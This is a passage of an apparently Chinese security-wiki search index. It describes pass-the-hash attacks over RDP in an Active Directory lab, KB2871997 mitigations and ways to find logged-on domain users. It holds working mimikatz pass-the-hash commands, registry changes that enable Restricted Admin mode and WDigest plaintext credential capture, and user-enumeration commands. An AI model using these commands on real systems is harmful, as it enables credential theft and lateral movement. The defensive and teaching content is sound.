\u7684\u8eab\u4efd\u9a8c\u8bc1\u3002\u4f7f\u7528\u8fd9\u79cd\u767b\u5f55\u7c7b\u578b\u53ef\u4ee5\u786e\u4fdd\u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u4e0d\u4fdd\u5b58\u7528\u6237\u7684\u51ed\u636e\u3002</p> <p>KB2871997 \u8865\u4e01\u4f7f\u5f97\u4f4e\u4e8e Windows 8.1 \u548c Windows Server 2012R2 \u7248\u672c\u7684\u673a\u5668\u4e5f\u652f\u6301<code>\"Restricted Admin RDP\"</code> \u6a21\u5f0f\u3002\u4f46\u662f\u4ece\u4e0a\u9762\u7684\u63cf\u8ff0\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c<code>\"Restricted Admin RDP\"</code> \u6a21\u5f0f\u5bf9 PTH \u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u5e76\u6ca1\u6709\u6709\u6548\u6539\u5584\u3002\u53cd\u800c\u5f15\u5165\u4e86\u4e00\u79cd\u65b0\u7684\u653b\u51fb\u65b9\u5f0f\u2014\u2014Pass The Hash with Remote Desktop\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html#pass-the-hash-with-remote-desktop","title":"Pass The Hash with Remote Desktop","text":"<p>\u5e94\u7528\u4e86\"Restricted Admin RDP\" \u6a21\u5f0f\u7684\u4e3b\u673a\u652f\u6301\u4f7f\u7528 hash \u51ed\u636e\u6765 RDP \u767b\u5f55\u8fdc\u7a0b\u4e3b\u673a\uff0c\u800c\u65e0\u9700\u8f93\u5165\u7528\u6237\u7684\u660e\u6587\u5bc6\u7801\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7 Hash \u6765\u8fdb\u884c RDP \u8fdc\u7a0b\u684c\u9762\u767b\u5f55\u3002\u4f46\u662f\u524d\u63d0\u662f\u4f7f\u7528 PTH \u8fdb\u884c RDP \u767b\u5f55\u8981\u6c42\u8fdb\u884c\u8fde\u63a5\u7684\u5ba2\u6237\u7aef\u4e5f\u5f97\u652f\u6301\"Restricted Admin RDP\" \u6a21\u5f0f\uff0c\u5e76\u4e14\u8fde\u63a5\u7684\u7528\u6237\u9700\u8981\u662f\u672c\u5730\u7ba1\u7406\u5458\u7528\u6237\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u76ee\u6807\u4e3b\u673a\u5b58\u5728 test\u3001hack \u548c administrator \u7528\u6237\u3002</p> <p></p> <p>test \u662f\u666e\u901a\u7528\u6237\uff0c\u800c hack \u548c administrator \u662f\u672c\u5730\u7ba1\u7406\u5458\u7528\u6237\u3002\u4e09\u4e2a\u7528\u6237\u5747\u80fd\u901a\u8fc7 RDP \u4f7f\u7528\u660e\u6587\u8d26\u53f7\u5bc6\u7801\u8fdb\u884c\u8fde\u63a5\u3002\u73b0\u5728\u6211\u4eec\u77e5\u9053\u4e86\u8fd9\u4e09\u4e2a\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\uff0c\u4f46\u6ca1\u6709\u89e3\u51fa\u660e\u6587\u5bc6\u7801\u3002\u73b0\u5728\uff0c\u6211\u4eec\u60f3\u5229\u7528\u5bc6\u7801 Hash \u8fdb\u884c RDP \u7684 PTH \u653b\u51fb\u3002</p> <p>\u4f7f\u7528 administrator \u8d26\u53f7\u5bc6\u7801\u54c8\u5e0c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c PTH \u54c8\u5e0c\u4f20\u9012 RDP \u670d\u52a1\u3002</p> <pre><code>privilege::debug\nsekurlsa::pth /user:administrator /domain:10.211.55.16 /ntlm:329153f560eb329c0e1deea55e88a1e9 \"/run:mstsc.exe /restrictedadmin\"\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 administrator \u5bc6\u7801\u54c8\u5e0c\u8fdb\u884c PTH \u54c8\u5e0c\u4f20\u9012 RDP \u670d\u52a1\u653b\u51fb\u6210\u529f\u3002</p> <p></p> <p>\u4f7f\u7528 hack \u8d26\u53f7\u5bc6\u7801\u54c8\u5e0c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c PTH \u54c8\u5e0c\u4f20\u9012 RDP \u670d\u52a1\u3002</p> <pre><code>privilege::debug\nsekurlsa::pth /user:hack /domain:10.211.55.16 /ntlm:329153f560eb329c0e1deea55e88a1e9 \"/run:mstsc.exe /restrictedadmin\"\n</code></pre> <p>\u4f7f\u7528 hack \u5bc6\u7801\u54c8\u5e0c\u8fdb\u884c PTH \u54c8\u5e0c\u4f20\u9012 RDP \u670d\u52a1\u653b\u51fb\u6210\u529f\u3002</p> <p></p> <p>\u4f7f\u7528 test \u8d26\u53f7\u5bc6\u7801\u54c8\u5e0c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c PTH \u54c8\u5e0c\u4f20\u9012 RDP \u670d\u52a1\u3002</p> <pre><code>privilege::debug\nsekurlsa::pth /user:test /domain:10.211.55.16 /ntlm:329153f560eb329c0e1deea55e88a1e9 \"/run:mstsc.exe /restrictedadmin\"\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 test \u5bc6\u7801\u54c8\u5e0c\u8fdb\u884c PTH \u54c8\u5e0c\u4f20\u9012 RDP \u670d\u52a1\u653b\u51fb\u5931\u8d25\u3002\u63d0\u793a\u8fde\u63a5\u88ab\u62d2\u7edd\uff01\u539f\u56e0\u5728\u4e8e test \u7528\u6237\u4e0d\u662f\u76ee\u6807\u4e3b\u673a\u7684\u672c\u5730\u7ba1\u7406\u5458\u7528\u6237\u3002</p> <p></p> <p>\u5982\u679c\u76ee\u6807\u4e3b\u673a\u652f\u6301\"Restricted Admin RDP\" \u6a21\u5f0f\uff0c\u4f46\u6ca1\u6709\u5f00\u542f\u7684\u8bdd\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5f00\u542f\uff1a</p> <pre><code>REG ADD HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f\n</code></pre> <p>\u6267\u884c\u4ee5\u4e0a\u547d\u4ee4\u5f00\u542f\u4e86\"Restricted Admin RDP\" \u6a21\u5f0f\u540e\uff0c\u53ef\u4ee5\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u67e5\u8be2\u662f\u5426\u5f00\u542f\u6210\u529f\u3002\u503c\u4e3a 0\uff0c\u4ee3\u8868\u5f00\u542f; \u503c\u4e3a 1\uff0c\u4ee3\u8868\u5173\u95ed</p> <pre><code>REG query \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" | findstr \"DisableRestrictedAdmin\"\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html#3pass-the-hash","title":"3.\"Pass The Hash\"\u589e\u5f3a\u4fdd\u62a4","text":""},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html#1","title":"(1) \u6ce8\u9500\u65f6\u6e05\u9664\u51ed\u636e","text":"<p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5f53\u7528\u6237\u8fdc\u7a0b\u684c\u9762\u767b\u5f55\u65f6\uff0cWindows \u4f1a\u5728 LSASS \u5185\u5b58\u4e2d\u7f13\u5b58\u7528\u6237\u7684\u660e\u6587\u51ed\u636e\u3001NTLM \u5bc6\u7801\u6563\u5217\u3001Kerberos TGT \u7968\u636e\u7b49\u3002\u4f46\u662f\uff0c\u5728\u7528\u6237\u6ce8\u9500\u540e\uff0c\u8fd9\u4e9b\u51ed\u636e\u5374\u4e0d\u4e00\u5b9a\u4f1a\u5728 LSASS \u5185\u5b58\u4e2d\u6e05\u9664\u3002\u800c\u6b64\u66f4\u65b0\u53ef\u4ee5\u786e\u4fdd\u5728\u7528\u6237\u6ce8\u9500\u540e\u5728\u8fdb\u7a0b\u4e2d\u6e05\u9664\u8fd9\u4e9b\u51ed\u636e\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html#2-lsass","title":"(2) \u4ece LSASS \u5185\u5b58\u5220\u9664\u660e\u6587\u51ed\u8bc1","text":"<p>\u901a\u8fc7\u5c06\u660e\u6587\u51ed\u8bc1\u4ece LSASS \u5185\u5b58\u4e2d\u79fb\u9664\uff0c\u653b\u51fb\u8005\u65e0\u6cd5\u901a\u8fc7 mimikatz \u7b49\u5de5\u5177\u4ece\u5185\u5b58\u4e2d\u6293\u53d6\u5230\u7528\u6237\u7684\u660e\u6587\u51ed\u636e\uff0c\u4f46\u662f NTLM \u54c8\u5e0c\u3001Kerberos \u7968\u636e\u7b49\u4ecd\u7136\u4f1a\u5b58\u50a8\u5728LSASS \u5185\u5b58\u4e2d\u3002\u8be5\u529f\u80fd\u662f\u901a\u8fc7\u7981\u7528 Wdigest \u8ba4\u8bc1\u6765\u5b9e\u73b0\u7684\u3002\u56e0\u6b64\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cWindows 8.1 \u548c Windows Server2012R2 \u9ad8\u7248\u672c\u7cfb\u7edf\u662f\u6ca1\u6709<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential</code> \u6ce8\u518c\u8868\u952e\uff0c\u8bf4\u660e\u7981\u7528\u4e86 Wdigest \u8ba4\u8bc1\u3002\u4f46\u662f\u5b9e\u9645\u60c5\u51b5\u662f\u6709\u4e00\u4e9b\u670d\u52a1\u9700\u8981\u5f00\u542f Wdigest \u8ba4\u8bc1\uff0c\u56e0\u6b64\u7ba1\u7406\u5458\u53ef\u4ee5\u624b\u52a8\u6ce8\u518c\u8be5<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential</code> \u952e\uff0c\u5e76\u901a\u8fc7\u5c06\u5176\u8d4b\u503c\u4e3a 0 \u6216 1 \u6765\u9009\u62e9\u5173\u95ed\u6216\u5f00\u542f Wdigest \u8ba4\u8bc1\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709 UseLogonCredential \u6ce8\u518c\u8868\u3002</p> <p></p> <p>\u56e0\u6b64\uff0c\u5728\u9ad8\u7248\u672c\u7cfb\u7edf\u4e2d\u662f\u65e0\u6cd5\u901a\u8fc7 mimikatz \u6293\u5230\u660e\u6587\u5bc6\u7801\u7684\u3002\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u5982\u679c\u5b89\u5168\u7814\u7a76\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u624b\u52a8\u6ce8\u518c\u8be5<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential</code>\u952e\uff0c\u5e76\u4e14\u5c06\u5176\u503c\u8d4b\u4e3a 1 \u7684\u8bdd\uff0c\u5373\u4f7f\u5728\u6253\u4e86\u8865\u4e01\u7684\u7cfb\u7edf\u4e2d\uff0c\u4e5f\u80fd\u5728\u5185\u5b58\u4e2d\u6293\u5230\u660e\u6587\u51ed\u636e\u3002</p> <pre><code>reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n</code></pre> <p>\u5982\u56fe\u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u589e\u52a0\u4e86 UseLogonCredential \u952e\uff0c\u5e76\u4e14\u5176\u503c\u5df2\u7ecf\u4e3a 1 \u4e86\u3002</p> <p></p> <p>\u518d\u6b21\u4f7f\u7528 mimikatz \u6293\u53d6\u5bc6\u7801\uff0c\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\uff0c\u80fd\u6293\u5230\u660e\u6587\u5bc6\u7801\u4e86\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html#3-sid","title":"(3) \u5f15\u5165\u65b0\u7684 SID","text":"<p>\u8be5\u8865\u4e01\u5f15\u5165\u4e86\u4ee5\u4e0b\u4e24\u4e2a\u65b0\u7684 SID\uff1a</p> <ul> <li>LOCAL_ACCOUNT\uff08S-1-5-113\uff09\uff1a\u6240\u6709\u672c\u5730\u5e10\u6237\u7ee7\u627f\u6b64 SID\u3002</li> <li>LOCAL_ACCOUNT_AND_MEMBER_OF_ADMINISTRATORS_GROUP\uff08S-1-5-114\uff09\uff1a\u6240\u6709\u7ba1\u7406\u5458\u7ec4\u7684\u672c\u5730\u5e10\u6237\u7ee7\u627f\u6b64 SID\u3002</li> </ul> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u4e24\u4e2a SID\u3002</p> <p></p> <p>\u4f5c\u4e3a\u7f51\u7edc\u7ba1\u7406\u5458\uff0c\u53ef\u4ee5\u901a\u8fc7\u7ec4\u7b56\u7565\u8bbe\u7f6e\u201c\u62d2\u7edd\u4ece\u7f51\u7edc\u8bbf\u95ee\u6b64\u8ba1\u7b97\u673a\u201d\u548c\u201c\u62d2\u7edd\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u670d\u52a1\u767b\u5f55\u201d\u8fd9\u4e24\u4e2a\u5b89\u5168\u9009\u9879\u6765\u7981\u6b62\u672c\u5730\u8d26\u6237\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u548c\u7f51\u7edc\u8bbf\u95ee\u8ba1\u7b97\u673a\u3002\u4f46\u662f\u57df\u7528\u6237\u4e0d\u53d7\u5f71\u54cd\uff01</p> <p>\u5982\u56fe\u6240\u793a\u914d\u7f6e\uff0c\u6253\u5f00\u7ec4\u7b56\u7565\uff0c\u8ba1\u7b97\u673a\u914d\u7f6e\u2014\u2014&gt;Windows \u8bbe\u7f6e\u2014\u2014&gt;\u5b89\u5168\u8bbe\u7f6e\u2014\u2014\u672c\u5730\u7b56\u7565\u2014\u2014&gt;\u7528\u6237\u6743\u9650\u5206\u914d\uff0c\u627e\u5230\u201c\u62d2\u7edd\u4ece\u7f51\u7edc\u8bbf\u95ee\u6b64\u8ba1\u7b97\u673a\u201d\u548c\u201c\u62d2\u7edd\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u670d\u52a1\u767b\u5f55\u201d\u8fd9\u4e24\u4e2a\u9009\u9879</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u5c06\u672c\u5730\u8d26\u6237\u6dfb\u52a0\u5230\u201c\u62d2\u7edd\u4ece\u7f51\u7edc\u8bbf\u95ee\u8fd9\u53f0\u8ba1\u7b97\u673a\u201d\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u5c06\u672c\u5730\u8d26\u6237\u6dfb\u52a0\u5230\u201c\u62d2\u7edd\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u670d\u52a1\u767b\u5f55\u201d\u3002</p> <p></p> <p>\u73b0\u5728\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528\u672c\u5730\u8d26\u6237\u548c\u57df\u8d26\u53f7\u8fdb\u884c\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5\u548c\u8fdc\u7a0b\u54c8\u5e0c\u4f20\u9012\u8fde\u63a5\u6d4b\u8bd5\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u8bbe\u7f6e\u4e86\u8be5\u7ec4\u7b56\u7565\u540e\uff0c\u4f7f\u7528\u672c\u5730\u8d26\u53f7\u5c06\u65e0\u6cd5\u8fdb\u884c\u8fdc\u7a0b\u684c\u9762\u8fde\u63a5\u548c\u8fdc\u7a0b\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u8fde\u63a5\u4e86\u3002</p> <p></p> <p>\u800c\u57df\u7528\u6237\u5219\u4e0d\u53d7\u6b64\u7ec4\u7b56\u7565\u5f71\u54cd\uff0c\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u56e0\u6b64\uff0c\u8865\u4e01\u5f15\u5165\u7684\u8fd9\u4e24\u4e2a\u65b0\u7684 SID \u5bf9\u4e8e\u672c\u5730\u8d26\u53f7\u7684\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u6709\u4e00\u5b9a\u7f13\u89e3\u4f5c\u7528\uff0c\u4e0d\u8fc7\u9700\u8981\u7f51\u7edc\u7ba1\u7406\u5458\u624b\u52a8\u914d\u7f6e\u7ec4\u7b56\u7565\u624d\u80fd\u751f\u6548\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article8/index.html#pth_1","title":"PTH \u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u9632\u5fa1","text":"<p>\u4ece\u4e0a\u9762\u7684\u5206\u6790\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0cPTH \u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u76ee\u524d\u5e76\u4e0d\u80fd\u5b8c\u5168\u6839\u9664\uff0c\u53ea\u80fd\u8bf4\u91c7\u53d6\u63aa\u65bd\u6765\u8fdb\u884c\u9632\u5fa1\u3002\u603b\u7684\u6765\u8bf4\uff0c\u53ef\u4ee5\u91c7\u53d6\u4ee5\u4e0b\u63aa\u65bd\u6765\u8fdb\u884c\u9632\u5fa1\uff1a</p> <ul> <li>\u5c06<code>KEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\FilterAdministratorToken</code> \u503c\u8bbe\u7f6e\u4e3a 1\uff0c\u7981\u6b62\u5185\u7f6e\u7684\u672c\u5730\u7ba1\u7406\u5458 administrator \u8fdb\u884c\u8fdc\u7a0b\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u3002</li> <li>\u76d1\u63a7<code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy</code> \u503c\uff0c\u9632\u6b62\u5176\u88ab\u4fee\u6539\u4e3a 1\u3002</li> <li>\u901a\u8fc7\u7ec4\u7b56\u7565\u914d\u7f6e\u8bbe\u7f6e\u201c\u62d2\u7edd\u4ece\u7f51\u7edc\u8bbf\u95ee\u6b64\u8ba1\u7b97\u673a\u201d\u548c\u201c\u62d2\u7edd\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u670d\u52a1\u767b\u5f55\u201d\u8fd9\u4e24\u4e2a\u5b89\u5168\u9009\u9879\u6765\u7981\u6b62\u672c\u5730\u8d26\u6237\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u548c\u7f51\u7edc\u8bbf\u95ee\u8ba1\u7b97\u673a\u3002</li> <li>\u5c06\u57df\u5185\u654f\u611f\u7528\u6237\u52a0\u5165\"Protected Users\"\u7ec4\uff0c\u53ef\u4ee5\u6709\u6548\u963b\u6b62\u654f\u611f\u7528\u6237\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u3002</li> </ul> <p>\u901a\u8fc7\u4ee5\u4e0a\u63aa\u65bd\uff0c\u53ef\u4ee5\u963b\u6b62\u672c\u5730\u8d26\u6237\u548c\u57df\u5185\u654f\u611f\u7528\u6237\u7684\u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u3002\u4f46\u662f\u57df\u5185\u7528\u6237\u4f17\u591a\uff0c\u4e0d\u53ef\u80fd\u5c06\u6240\u6709\u7528\u6237\u90fd\u52a0\u5165\"Protected Users\"\u7ec4\uff0c\u56e0\u6b64\u9488\u5bf9\u57df\u7528\u6237\u7684\u54c8\u5e0c\u4f20\u9012\u76ee\u524d\u8fd8\u6bd4\u8f83\u56f0\u96be\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article9/index.html","title":"\u5b9a\u4f4d\u7528\u6237\u767b\u5f55\u7684\u4e3b\u673a","text":"<p>\u5728\u57df\u6a2a\u5411\u8fc7\u7a0b\u6216\u62ff\u4e0b\u57df\u63a7\u5236\u5668\u4e4b\u540e\u7684\u540e\u6e17\u900f\u8fc7\u7a0b\uff0c\u5f80\u5f80\u9700\u8981\u7cbe\u786e\u7684\u5b9a\u4f4d\u67d0\u4e9b\u7528\u6237\u5f53\u524d\u5728\u54ea\u53f0\u673a\u5668\u767b\u5f55\u7740\uff0c\u624d\u6709\u66f4\u52a0\u9488\u5bf9\u6027\u7684\u76ee\u7684\u53bb\u62ff\u4e0b\u67d0\u53f0\u4e3b\u673a\uff0c\u4ece\u800c\u83b7\u5f97\u4e3b\u673a\u4e0a\u767b\u5f55\u7740\u7684\u7528\u6237\u7684\u6743\u9650\u3002\u90a3\u4e48\uff0c\u5728\u57df\u4e2d\u5982\u4f55\u80fd\u77e5\u9053\u67d0\u53f0\u673a\u5668\u4e0a\u5f53\u524d\u767b\u5f55\u7740\u7684\u7528\u6237\u4ee5\u53ca\u5982\u4f55\u80fd\u77e5\u9053\u6307\u5b9a\u7528\u6237\u5f53\u524d\u767b\u5f55\u7684\u4e3b\u673a\u5462\uff1f</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article9/index.html#_2","title":"\u6ce8\u518c\u8868\u67e5\u8be2","text":"<p>\u6ce8\u518c\u8868\u67e5\u8be2\u529f\u80fd\uff0c\u53ef\u4ee5\u5728\u57df\u6a2a\u5411\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u666e\u901a\u57df\u7528\u6237\u679a\u4e3e\u57df\u5185\u670d\u52a1\u5668\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\uff0c\u539f\u7406\u5982\u4e0b\uff1a</p> <p>\u5f53\u7528\u6237\u767b\u5f55\u4e86\u67d0\u53f0\u4e3b\u673a\uff0c\u5728\u8be5\u4e3b\u673a\u7684 HKEY_USERS \u6ce8\u518c\u8868\u5185\u4f1a\u6709\u8be5\u7528\u6237\u7684\u6587\u4ef6\u5939\u3002\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230 HKEY_USERS \u6ce8\u518c\u8868\u4e0b\u6709 S-1-5-21-1313979556-3624129433-4055459191-1154 \u7684\u6587\u4ef6\u5939\u3002</p> <p></p> <p>\u4f7f\u7528 adfind \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u67e5\u627e SID \u4e3a S-1-5-21-1313979556-3624129433-4055459191-1154 \u7684\u7528\u6237\uff1a</p> <pre><code>AdFind.exe -f \"objectSid=S-1-5-21-1313979556-3624129433-4055459191-1154\" -dn\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u67e5\u8be2\u5230 SID \u4e3a S-1-5-21-1313979556-3624129433-4055459191-1154 \u5bf9\u5e94\u7684\u7528\u6237\u4e3a hack\u3002\u8bf4\u660e hack \u7528\u6237\u767b\u5f55\u7740\u5f53\u524d\u673a\u5668\uff01</p> <p></p> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fdc\u7a0b\u8fde\u63a5\u673a\u5668\uff0c\u67e5\u770b\u5176\u6ce8\u518c\u8868\u9879\u503c\u6765\u77e5\u9053\u8c01\u5728\u767b\u5f55\u76ee\u6807\u673a\u5668\u3002\u8fdc\u7a0b\u67e5\u770b\u6ce8\u518c\u8868\u9879\u8fd9\u4e2a\u64cd\u4f5c\u53ef\u4ee5\u901a\u8fc7 API \u6765\u5b9e\u73b0\uff0c\u6211\u4eec\u53ef\u4ee5\u904d\u5386\u57df\u5185\u6240\u6709\u673a\u5668\uff0c\u67e5\u8be2\u673a\u5668\u6b63\u5728\u767b\u9646\u7684\u7528\u6237\u3002\u5e76\u4e14\u8be5 API \u57df\u5185\u666e\u901a\u7528\u6237\u5373\u53ef\u8c03\u7528\u67e5\u8be2\u3002</p> <p>\u4f46\u662f\u9700\u8981\u6ce8\u610f\u4ee5\u4e0b\u4e09\u70b9:</p> <ul> <li>\u9ed8\u8ba4 PC \u673a\u5668\u662f\u6ca1\u6709\u5f00\u542f\u6ce8\u518c\u8868\u8fdc\u7a0b\u8fde\u63a5\u7684\uff0c\u56e0\u6b64 PC \u673a\u5668\u65e0\u6cd5\u67e5\u8be2\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\u3002</li> <li>\u9ed8\u8ba4\u670d\u52a1\u5668\u5f00\u542f\u4e86\u6ce8\u518c\u8868\u8fdc\u7a0b\u8fde\u63a5\uff0c\u56e0\u6b64\u670d\u52a1\u5668\u53ef\u4ee5\u67e5\u8be2\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\u3002</li> <li>\u57df\u5185\u4efb\u4f55\u7528\u6237\uff0c\u5373\u4f7f\u914d\u7f6e\u4e86\u4e0d\u80fd\u672c\u5730 RDP \u767b\u5f55\u57df\u5185\u673a\u5668 A\uff0c\u4f46\u662f\u53ea\u8981\u57df\u5185\u673a\u5668 A \u5f00\u542f\u4e86\u8fdc\u7a0b\u6ce8\u518c\u8868\u8fde\u63a5\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7 API \u67e5\u8be2\u673a\u5668 A \u7684\u6ce8\u518c\u8868\uff0c\u67e5\u8be2\u6b63\u5728\u767b\u9646\u7684\u7528\u6237\u3002</li> </ul> <p>\u4ee5\u4e0b\u6f14\u793a\u4e24\u6b3e\u6bd4\u8f83\u597d\u7528\u7684\u5de5\u5177\uff1aPsloggedon.exe \u548c PVEFindADUser.exe\uff0c\u8fd9\u4e24\u4e2a\u5de5\u5177\u90fd\u662f\u4f7f\u7528\u6ce8\u518c\u8868\u6765\u67e5\u8be2\u76ee\u6807\u673a\u5668\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article9/index.html#psloggedon","title":"Psloggedon","text":"<p>\u8fd9\u662f\u4e00\u6b3e\u5fae\u8f6f\u5b98\u65b9\u63d0\u4f9b\u7684\u53ef\u4ee5\u67e5\u8be2\u670d\u52a1\u5668\u5f53\u524d\u767b\u5f55\u7528\u6237\u7684\u5de5\u5177\u3002\u8be5\u5de5\u5177\u7684\u539f\u7406\u662f\u901a\u8fc7\u68c0\u67e5\u6ce8\u518c\u8868 HKEY_USERS \u9879\u7684 Key \u503c \u548c \u901a\u8fc7 NetSessionEnum API \u6765\u679a\u4e3e\u7f51\u7edc\u4f1a\u8bdd\u3002\u8be5\u5de5\u5177\u5728\u5b9e\u73b0\u67e5\u8be2\u6307\u5b9a\u7528\u6237\u767b\u5f55\u7684\u4e3b\u673a\u529f\u80fd\u65f6\u6709\u95ee\u9898\uff0c\u56e0\u6b64\u4ee5\u4e0b\u4e0d\u6f14\u793a\u3002\u8be5\u5de5\u5177\u7684\u8fd0\u884c\u4e0d\u9700\u8981\u57df\u7ba1\u7406\u5458\u6743\u9650\uff0c\u53ea\u9700\u8981\u666e\u901a\u57df\u7528\u6237\u6743\u9650\u5373\u53ef\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article9/index.html#1","title":"(1) \u67e5\u8be2\u672c\u673a\u767b\u5f55\u7684\u7528\u6237","text":"<pre><code>PsLoggedon.exe /accepteula\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article9/index.html#2","title":"(2) \u67e5\u8be2\u6307\u5b9a\u4e3b\u673a\u767b\u5f55\u7684\u7528\u6237","text":"<p>\u5728\u57df\u4e2d\uff0c\u4ec5\u9700\u8981\u4e00\u4e2a\u666e\u901a\u57df\u7528\u6237\u6743\u9650\uff0c\u5c31\u53ef\u679a\u4e3e\u51fa\u57df\u5185\u6240\u6709\u670d\u52a1\u5668(\u5305\u62ec\u57df\u63a7)\u5f53\u524d\u7684\u767b\u5f55\u7528\u6237\u3002\u7531\u4e8e PC \u673a\u5668\u9ed8\u8ba4\u6ca1\u6709\u5f00\u542f\u6ce8\u518c\u8868\u8fdc\u7a0b\u8fde\u63a5\uff0c\u56e0\u6b64 PC \u673a\u5668\u65e0\u6cd5\u67e5\u8be2\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\uff1b\u800c\u670d\u52a1\u5668\u9ed8\u8ba4\u5f00\u542f\u6ce8\u518c\u8868\u8fdc\u7a0b\u8fde\u63a5\uff0c\u56e0\u6b64\u670d\u52a1\u5668\u53ef\u4ee5\u67e5\u8be2\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\u3002</p> <p>\u4f7f\u7528 Psloggedon.exe \u5206\u522b\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u67e5\u8be2\u6307\u5b9a\u4e3b\u673a win7\u3001win2008\u3001AD01 \u548c10.211.55.7 \u673a\u5668\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\u3002</p> <pre><code>#\u67e5\u8be2 win7 \u673a\u5668\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\uff0c\u7531\u4e8e PC \u673a\u5668\u9ed8\u8ba4\u6ca1\u6709\u5f00\u542f\u6ce8\u518c\u8868\u8fdc\u7a0b\u8fde\u63a5\uff0c\u6240\u4ee5\u67e5\u8be2\u4f1a\u5931\u8d25\nPsLoggedon.exe /accepteula \\\\win7\n#\u67e5\u8be2 win2008 \u670d\u52a1\u5668\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\nPsLoggedon.exe /accepteula \\\\win2008\n#\u67e5\u8be2 AD01 \u57df\u63a7\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\nPsLoggedon.exe 